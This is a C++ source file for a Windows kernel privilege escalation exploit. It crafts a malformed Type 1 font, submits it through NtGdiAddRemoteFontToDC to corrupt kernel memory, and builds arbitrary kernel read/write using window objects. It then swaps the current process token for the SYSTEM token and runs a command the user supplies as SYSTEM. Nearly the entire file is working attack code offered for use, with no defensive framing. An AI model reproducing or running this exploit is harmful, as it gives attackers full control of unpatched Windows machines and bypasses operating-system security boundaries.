
#include <stdlib.h>
#include <stdio.h>
#include <STDARG.H>
#include <stddef.h>
#include <windows.h>
#include <math.h>
#include <Shellapi.h>
//#include <VersionHelpers.h>


#pragma once
extern "C" VOID NtGdiAddRemoteFontToDC_Win7(HDC hdc, PVOID pvBuffer, ULONG cjBuffer, DESIGNVECTOR * pdv);
extern "C" VOID NtGdiAddRemoteFontToDC_Win8(HDC hdc, PVOID pvBuffer, ULONG cjBuffer, DESIGNVECTOR * pdv);
extern "C" void ReplaceToken_Win7();
extern "C" void ReplaceToken_Win8();


extern unsigned char payloadData3[3568];

BOOL g_bWin7 = TRUE;
HWND    gHwndWnd1 = NULL;
HWND    gHwndWnd2 = NULL;
ULONG64 gWndAddr1 = 0;
ULONG64 gWndAddr2 = 0;

unsigned char pfmData[684] = {
	0x00, 0x01, 0x8C, 0x02, 0x00, 0x00, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x00, 0x81, 0x00, 0x0A, 0x00, 0x2C, 0x01, 0x2C, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x90, 0x01, 0x80, 0x02, 0x00, 0xE8, 0x03, 0x10, 0xF4, 0x01, 0xE8, 0x03, 0x20,
	0xFF, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x00, 0x00, 0x00, 0xD2, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x1E, 0x00, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x6F, 0x73, 0x74, 0x53, 0x63, 0x72, 0x69, 0x70,
	0x74, 0x00, 0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x57, 0x6F, 0x72, 0x6C, 0x64, 0x21, 0x00, 0x48, 0x65,
	0x6C, 0x6C, 0x6F, 0x57, 0x6F, 0x72, 0x6C, 0x64, 0x21, 0x00, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
	0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x00, 0x00
};




typedef struct tagTYPE1FONTHEADER
{
	ULONG IsType1Font;
	ULONG NumberOfFiles;
	ULONG Offsets[2];
	BYTE Data[1];
}TYPE1FONTHEADER, *PTYPE1FONTHEADER;

typedef struct tagEXPLOIT_CONTEXT
{
	ULONG IsType1Font;
}EXPLOIT_CONTEXT, *PEXPLOIT_CONTEXT;

#define OSVER_WIN_10     4
#define OSVER_WIN_8_1    3
#define OSVER_WIN_8      2
#define OSVER_WIN_7      1
#define OSVER_WIN_VISTA  0


#define Sizeof_tagWND                          0x128
#define Offset_tagWND_pti                      0x10 
#define Offset_tagWND_cbwndExtra               0xE8
#define Offset_tagWND_strName                  0xD8 

#define Offset_STRING_Length                   0x00
#define Offset_STRING_MaximumLength                0x04
#define Offset_STRING_Buffer                   0x08

#define Offset_KTHREAD_ApcState                    0x50
#define Offset_KAPC_STATE_Process              0x20

#define Offset_EPROCESS_UniqueProcessId        0x180 
#define Offset_EPROCESS_ActiveProcessLinks     0x188
#define Offset_EPROCESS_Token                      0x208

DWORD gToolWndStrNameOffset = 0;
typedef struct _HANDLEENTRY {
	PVOID   phead;
	PVOID   pOwner;
	BYTE    bType;
	BYTE    bFlags;
	WORD    wUniq;
} HANDLEENTRY, *PHANDLEENTRY;

typedef struct _SERVERINFO {
	WORD    wRIPFlags;
	WORD    wSRVIFlags;
	WORD    wRIPPID;
	WORD    wRIPError;
	ULONG   cHandleEntries;
} SERVERINFO, *PSERVERINFO;

typedef struct _SHAREDINFO {
	PSERVERINFO  psi;
	PHANDLEENTRY aheList;
	ULONG        HeEntrySize;
} SHAREDINFO, *PSHAREDINFO;


#if _MSC_VER
#define snprintf _snprintf
#endif
ULONG_PTR GetObjectKernelAddr(HWND hwnd)
{
	static PSHAREDINFO gSharedInfo = NULL;
	if (gSharedInfo == NULL)
	{
		gSharedInfo = (PSHAREDINFO)GetProcAddress(LoadLibraryA("user32"), "gSharedInfo");
		if (gSharedInfo == NULL)
		{
			return NULL;
		}
	}

	PHANDLEENTRY HandleTable = gSharedInfo->aheList;
	PHANDLEENTRY HandleEntry = (PHANDLEENTRY)&HandleTable[LOWORD(hwnd)];
	return (ULONG_PTR)HandleEntry->phead;
}
BOOL CreateToolWnd()
{
	gHwndWnd1 = CreateWindowExW(
		NULL, L"#32772", NULL,
		WS_MINIMIZE | WS_DISABLED,
		0, 0, 0, 0, NULL, NULL, NULL, NULL);

	gHwndWnd2 = CreateWindowExW(
		NULL, L"#32772", NULL,
		WS_MINIMIZE | WS_DISABLED,
		0, 0, 0, 0, NULL, NULL, NULL, NULL);

	if (gHwndWnd1 == NULL || gHwndWnd2 == NULL)
	{
		return FALSE;
	}

	ULONG_PTR WndAddr1 = GetObjectKernelAddr(gHwndWnd1);
	ULONG_PTR WndAddr2 = GetObjectKernelAddr(gHwndWnd2);
	if (WndAddr1 == 0 || WndAddr2 == 0)
	{
		return FALSE;
	}

	if (WndAddr1 < WndAddr2)
	{
		gWndAddr1 = WndAddr1;
		gWndAddr2 = WndAddr2;
	}
	else
	{
		gWndAddr1 = WndAddr2;
		gWndAddr2 = WndAddr1;
	}

	printf("gWndAddr1:%p\n", gWndAddr1);
	printf("gWndAddr2:%p\n", gWndAddr2);
	return TRUE;
}
VOID InitReadWriteKernelAddr()
{
	gToolWndStrNameOffset = (DWORD)((gWndAddr2 + Offset_tagWND_strName) - (gWndAddr1 + Sizeof_tagWND));

	SetWindowLongW(gHwndWnd1, gToolWndStrNameOffset + Offset_STRING_Length, 0x100);
	SetWindowLongW(gHwndWnd1, gToolWndStrNameOffset + Offset_STRING_MaximumLength, 0x100);
}
BOOL WriteKernelAddr64(UINT64 Addr, ULONG64 Value)
{
	SetWindowLongPtrW(gHwndWnd1, gToolWndStrNameOffset + Offset_STRING_Buffer, Addr);

	ULONG64 TempValue[2] = { 0 };
	TempValue[0] = Value;
	SetWindowTextW(gHwndWnd2, (PWCHAR)TempValue);

	return TRUE;
}
ULONG32 ReadKernelAddr32(UINT64 Addr)
{
	SetWindowLongPtrW(gHwndWnd1, gToolWndStrNameOffset + Offset_STRING_Buffer, Addr);

	ULONG32 Read[6] = { 0 };
	InternalGetWindowText(gHwndWnd2, (LPWSTR)&Read, 4);

	return Read[0];
}
ULONG64 ReadKernelAddr64(UINT64 Addr)
{
	ULONG32 LowAddr = ReadKernelAddr32(Addr);
	ULONG32 HighAddr = ReadKernelAddr32(Addr + sizeof(ULONG32));
	ULONG64 Read = ((ULONG64)HighAddr << 32) + LowAddr;
	return Read;
}
BOOL ReplaceToken()
{
	ULONG64 ptiAddr = ReadKernelAddr64(gWndAddr1 + Offset_tagWND_pti);
	printf("[+]pti : %llx\n", ptiAddr);

	ULONG64 pEThread = ReadKernelAddr64(ptiAddr);
	printf("[+]pEThread : %llx\n", pEThread);

	ULONG64 ApcState = ReadKernelAddr64(pEThread + Offset_KTHREAD_ApcState);
	printf("[+]ApcState : %llx\n", ApcState);

	ULONG64 Process = ReadKernelAddr64(ApcState + Offset_KAPC_STATE_Process);
	printf("[+]Process : %llx\n", Process);

	ULONG64 Token = ReadKernelAddr64(Process + Offset_EPROCESS_Token);
	printf("[+]Token : %llx\n", Token);

	ULONG64 NextProcess = Process;
	INT i = 0;
	while (TRUE)
	{
		NextProcess = ReadKernelAddr64(NextProcess + Offset_EPROCESS_ActiveProcessLinks) - Offset_EPROCESS_ActiveProcessLinks;
		ULONG64 Pid = ReadKernelAddr64(NextProcess + Offset_EPROCESS_UniqueProcessId);
		if (Pid == 4)
		{
			printf("[+]System Process : %llx\n", NextProcess);
			break;
		}
		if (i++ > 0x1000)
		{
			printf("[+]ModifyToken Faild..\n");
			return FALSE;
		}
	}

	ULONG64 SystemTokenPtr = ReadKernelAddr64(NextProcess + Offset_EPROCESS_Token);
	printf("[+]SystemTokenPtr : %llx\n", SystemTokenPtr);

	WriteKernelAddr64(Process + Offset_EPROCESS_Token, SystemTokenPtr);
	printf("[+]ModifyToken Successed..\n");

	return TRUE;
}
void CharToTchar(const char * _char, TCHAR * tchar)
{
	int iLength;

	iLength = MultiByteToWideChar(CP_ACP, 0, _char, strlen(_char) + 1, NULL, 0);
	MultiByteToWideChar(CP_ACP, 0, _char, strlen(_char) + 1, tchar, iLength);
}
void runCmd(char* argv[])
{
	SECURITY_ATTRIBUTES		sa;
	HANDLE					hRead, hWrite;
	byte					buf[40960] = { 0 };
	STARTUPINFOW			si;
	PROCESS_INFORMATION		pi;
	DWORD					bytesRead;
	RtlSecureZeroMemory(&si, sizeof(si));
	RtlSecureZeroMemory(&pi, sizeof(pi));
	RtlSecureZeroMemory(&sa, sizeof(sa));
	int br = 0;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	if (!CreatePipe(&hRead, &hWrite, &sa, 0))
	{

	}
	printf("[*] Trying to execute %s as SYSTEM\n", argv[1]);
	si.cb = sizeof(STARTUPINFO);
	GetStartupInfoW(&si);
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;
	si.wShowWindow = SW_HIDE;
	si.lpDesktop = L"WinSta0\\Default";
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	wchar_t cmd[4096] = { 0 };


	CharToTchar(argv[1], cmd);

	if (!CreateProcessW(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
	{
		CloseHandle(hWrite);
		CloseHandle(hRead);
		printf("[!] CreateProcessW Failed![%lx]\n", GetLastError());
		//return -2;
	}
	CloseHandle(hWrite);
	printf("[+] ProcessCreated with pid %d!\n", pi.dwProcessId);
	while (1)
	{
		if (!ReadFile(hRead, buf + br, 4000, &bytesRead, NULL))
			break;
		br += bytesRead;
	}
	puts("===============================");
	puts((char*)buf);
	fflush(stdout);
	fflush(stderr);
	CloseHandle(hRead);
	CloseHandle(pi.hProcess);
}



double  HexToPostScriptNumber(unsigned int nNumber)
{

	signed int	nHiNumber = HIWORD(nNumber);

	if ((0x8000 & nHiNumber) != 0)
		nHiNumber = -1 - (~nHiNumber & 0x7fff);

	return (double)(int)(nNumber & 0xffff) / (double)(0x10000) + (double)nHiNumber;


}
int  generatePFB_(unsigned int hiwordWhere, unsigned int loWordWhere, unsigned int what, char* font_buffer, DWORD* pfb_size)
{


	//char* font_buffer = NULL;
	char* font_buffer_end = NULL;

	//font_buffer = new char[0x200];
	font_buffer_end = font_buffer + 0x200;

	char* p = font_buffer;

	p += 6;
	p += snprintf(p, 0x200 - 6, "%s", "%!FontType1-1.0: Symbol 001.008\r");
	p += snprintf(p, font_buffer_end - p, "%s", "11 dict begin\r");


	p += snprintf(p, font_buffer_end - p, "%s", "/WeightVector [");




	for (int i = 0; i < 10; i++)
	{
		p += snprintf(p, font_buffer_end - p, " %0.6f ", HexToPostScriptNumber(0x11111111));
	}

	p += snprintf(p, font_buffer_end - p, "%s", "]\r");


	p += snprintf(p, font_buffer_end - p, "%s", "/Private begin\r");
	p += snprintf(p, font_buffer_end - p, "%s", "/Blend begin\r");

	p += snprintf(
		p,
		font_buffer_end - p,
		"/VToHOrigin[[ %0.6f %0.6f %0.6f %0.6f %0.6f %0.6f %0.6f %0.6f %0.6f %0.6f ]]\r",
		HexToPostScriptNumber(loWordWhere),
		HexToPostScriptNumber(hiwordWhere),
		HexToPostScriptNumber(0xFFFF0000),
		HexToPostScriptNumber(0x7FFF),
		HexToPostScriptNumber(what),
		HexToPostScriptNumber(0x8000),
		HexToPostScriptNumber(0xFFFF0000),
		HexToPostScriptNumber(0x7FFF),
		HexToPostScriptNumber(0xFFFF0001),
		HexToPostScriptNumber(0x7FFF));

	memset(p, 'C', 32);

	p += 32;
	p += snprintf(p, font_buffer_end - p, "%s", "currentdict end\r");
	p += snprintf(p, font_buffer_end - p, "%s", "currentfile ");



	*(DWORD*)font_buffer = ((p - font_buffer - 6) << 16) + 0x180;

	p += snprintf(p, font_buffer_end - p, "%s", "eexec\r");

	memset(p, 'D', 32);


	p += 32;

	p += snprintf(p, font_buffer_end - p, "%s", "cleartomark\x00\x00\x00\r");


	*pfb_size = p - font_buffer + 3;


	return 0;
}


void NtGdiAddRemoteFontToDC_Wrapper(char *pfbData, int pfb_size)
{
	int nPfmSize = sizeof(pfmData);

	int nAlignPfmSize = (nPfmSize + 3) & 0xFFFFFFFC;
	int nAlignPfbSize = (pfb_size + 3) & 0xFFFFFFFC;

	PBYTE pBuffer = new BYTE[sizeof(TYPE1FONTHEADER) + nAlignPfmSize + nAlignPfbSize];
	PTYPE1FONTHEADER pType1FontHdr = (PTYPE1FONTHEADER)pBuffer;
	pType1FontHdr->IsType1Font = 1;
	pType1FontHdr->NumberOfFiles = 0;
	pType1FontHdr->Offsets[0] = nAlignPfmSize;
	pType1FontHdr->Offsets[1] = nAlignPfmSize + nAlignPfbSize;
	memcpy(pType1FontHdr->Data, pfmData, nPfmSize);
	memcpy(pType1FontHdr->Data + pType1FontHdr->Offsets[0], pfbData, pfb_size);

	HDC hdc = GetWindowDC(0);

	NtGdiAddRemoteFontToDC_Win7(hdc, pType1FontHdr, sizeof(TYPE1FONTHEADER) + nAlignPfmSize + nAlignPfbSize, 0);

	delete[]pBuffer;
}

bool Exploit()
{
	DWORD pfb_size = 0;

	char* pfbData = new char[0x200]();

	DWORD dwhig = (gWndAddr1 & 0xffffffff00000000) >> 32;

	DWORD dwlow = (gWndAddr1 & 0x00000000ffffffff);

	if (generatePFB_(dwhig, dwlow + Offset_tagWND_cbwndExtra, 0x11223344, pfbData, &pfb_size) || !pfbData)
	{
		if (pfbData) delete[]pfbData;
		return false;
	}

	NtGdiAddRemoteFontToDC_Wrapper(pfbData, pfb_size);

	delete[]pfbData;

	return true;
}

int main(int argc, char* argv[])
{

	if (argc < 2)
	{
		printf("useage:exploit.exe whoami");
		return 1;
	}


	system("pause");

	CreateToolWnd();

	bool bIsSuccess = Exploit();


	InitReadWriteKernelAddr();


	ReplaceToken();


	runCmd(argv);

	return 1;
}
